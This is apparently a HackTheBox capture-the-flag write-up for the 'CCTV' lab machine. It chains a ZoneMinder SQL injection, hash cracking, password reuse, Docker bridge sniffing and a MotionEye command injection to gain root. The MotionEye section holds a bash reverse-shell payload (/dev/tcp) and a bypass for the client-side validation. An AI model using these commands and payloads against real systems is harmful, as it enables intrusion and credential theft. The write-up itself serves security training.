# CCTV - HackTheBox Writeup

**Date:** 2026-07-12  
**Difficulty:** Medium  
**Target:** 10.129.55.18  
**OS:** Ubuntu  
**Tags:** SQL Injection, Password Reuse, Docker Sniffing, MotionEye RCE, CVE-2024-51482, CVE-2025-60787

---

## Flags

| Flag | Value |
|------|-------|
| User | `0bdeef453a4ac8f45e17bb09db967833` |
| Root | `22e06a9daaef5ab6346d6bdeed6b0de7` |

---

## Attack Chain

```
Nmap → Zoneminder (port 80) → SQLi (CVE-2024-51482) → bcrypt hashes
  → crack/mark:opensesame → SSH foothold
    → Docker bridge sniff → sa_mark:X1l9fx1ZjS7RZb → lateral movement
      → MotionEye RCE (CVE-2025-60787) → root
```

---

## Reconnaissance

### Nmap Scan

```
nmap -sC -sV -Pn -oN nmap.txt 10.129.55.18
```

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | SSH | OpenSSH 9.6p1 Ubuntu |
| 80/tcp | HTTP | Apache/2.4.58 (Ubuntu) |

- Port 80 redirects to `cctv.htb` (added to `/etc/hosts`)

### Web Enumeration

- Visiting `http://cctv.htb` shows a landing page
- `/zm/` reveals **Zoneminder v1.37.63** ( vulnerable to CVE-2024-51482 )
- `/zm/login` accepts `admin:admin` (default credentials)

---

## Step 1: SQL Injection (CVE-2024-51482)

### Vulnerability

Zoneminder v1.37.63 is vulnerable to a time-based blind SQL injection in the `cards[Id]` parameter of the API. The `cards` parameter is not sanitized, allowing arbitrary SQL injection.

### Exploitation

Used adapted PoC from [plur1bu5/CVE-2024-51482-PoC](https://github.com/plur1bu5/CVE-2024-51482-PoC):

```bash
# Time-based blind SQLi to extract bcrypt hashes
python3 exploits/cve-2024-51482_sqli.py \
  --host cctv.htb \
  --cookie "ZMSESSID=iuutf8nji3doss6dsnda9mf614" \
  --wordlist /usr/share/seclists/rockyou.txt \
  --table "zm.Users" \
  --column "Password"
```

### Extracted Hashes

```
admin:      $2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm
mark:       $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.
superadmin: $2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m
```

### Hash Cracking

```bash
hashcat -m 3200 hashes.txt /usr/share/seclists/rockyou.txt
```

**Result:** `mark:opensesame`

---

## Step 2: Foothold (SSH)

```bash
ssh mark@10.129.55.18
# Password: opensesame
```

### Enumeration

```bash
id          # uid=1000(mark) groups: mark,cdrom,dip,plugdev
ip a        # Docker bridges: br-1b6b4b93c636 (172.25.0.1), br-3e74116c4022 (172.18.0.1)
sudo -l     # Not sudo, not in docker group
```

---

## Step 3: Lateral Movement (Docker Traffic Sniffing)

### Discovery

Two Docker bridge interfaces with active containers:
- `br-1b6b4b93c636` (172.25.0.0/16)
- `br-3e74116c4022` (172.18.0.0/16)

### Sniffing

```bash
tcpdump -i br-1b6b4b93c636 -A -c 200 | grep -i -E "pass|user|auth|login"
```

### Captured Credentials (Cleartext)

```
USERNAME=sa_mark;PASSWORD=X1l9fx1ZjS7RZb;CMD=disk-info
```

### Pivot

```bash
ssh sa_mark@10.129.55.18
# Password: X1l9fx1ZjS7RZb
```

---

## Step 4: Privilege Escalation (MotionEye RCE - CVE-2025-60787)

### Discovery

MotionEye v0.43.1b4 running on localhost:8765 (accessible via SSH tunnel).

### Vulnerability

MotionEye writes user-supplied configuration values (e.g., `image_file_name`) directly into camera config files without sanitization. When the Motion service processes these files, shell syntax like `$(command)` is executed. The Web UI has client-side JavaScript validation that blocks `$(...)` payloads, but no server-side validation exists.

### Exploitation

1. **SSH tunnel:**
   ```bash
   # From attacker machine
   ssh -L 8765:127.0.0.1:8765 sa_mark@10.129.55.18
   ```

2. **Access MotionEye** at `http://127.0.0.1:8765` (admin, no password)

3. **Bypass client-side validation** (Browser Console - F12):
   ```javascript
   configUiValid = function() { return true; };
   ```

4. **Navigate to:** Camera Settings → Still Images → Image File Name

5. **Set Capture Mode** to `Interval Snapshots`, **Interval** to `10`

6. **Inject payload** in Image File Name:
   ```
   $(bash -c "bash -i >& /dev/tcp/10.10.14.9/4444 0>&1").%Y-%m-%d-%H-%M-%S
   ```

7. **Click Apply**

8. **Catch reverse shell:**
   ```bash
   nc -lvnp 4444
   ```

### Result

```
root@cctv:~# id
uid=0(root) gid=0(root) groups=0(root)
```

---

## Evidence

| File | Description |
|------|-------------|
| `loot/zm_hashes.txt` | Extracted bcrypt hashes from Zoneminder DB |
| `loot/credentials.txt` | All discovered credentials |
| `loot/nmap.txt` | Port scan results |
| `loot/exploits/cve-2024-51482_sqli.py` | SQLi PoC script |
| `loot/exploits/motioneye_rce.py` | MotionEye RCE exploit |

---

## Key Takeaways

1. **Default credentials** — Zoneminder admin:admin granted access to the application
2. **SQL injection** — CVE-2024-51482 allowed full database extraction via time-based blind injection
3. **Password reuse** — mark's Zoneminder password worked for SSH
4. **Cleartext Docker traffic** — Internal container communication exposed credentials in cleartext on the bridge interface
5. **Client-side only validation** — MotionEye's JavaScript validation was trivially bypassed, leading to unauthenticated RCE as root
